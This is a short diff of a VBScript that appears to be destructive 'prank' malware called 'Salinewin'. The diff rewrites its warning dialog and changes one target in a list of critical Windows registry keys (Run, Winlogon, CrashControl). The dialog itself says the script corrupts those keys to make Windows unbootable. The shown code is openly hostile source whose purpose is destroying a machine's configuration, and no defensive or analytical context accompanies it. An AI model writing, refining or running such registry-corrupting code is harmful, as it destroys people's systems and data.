@@ -2,7 +2,7 @@ Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
 ' =============== WARNING MESSAGE ====================
-answer = MsgBox("Warning!!!! This VbScript is capable of making your system unbootable as it corrupts the registry keys, If you are using a VM, take a snapshot then open, if this is a real PC, press No.", 36, "!!! DANGER !!!")
+answer = MsgBox("WARNING: This script will corrupt the registry and make Windows unbootable. Are you sure you want to continue?", 36, "!!! DANGER !!!")
 
 If answer <> 6 Then
     MsgBox "Operation cancelled.", 64, "Salinewin"
@@ -31,7 +31,7 @@ keys = Array( _
     "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", _
     "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon", _
     "HKLM\Software\Microsoft\Windows\CurrentVersion\Run", _
-    "HKLM\SYSTEM\CurrentControlSet\Services" _
+    "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\CrashControl" _
 )
 
 For Each key In keys
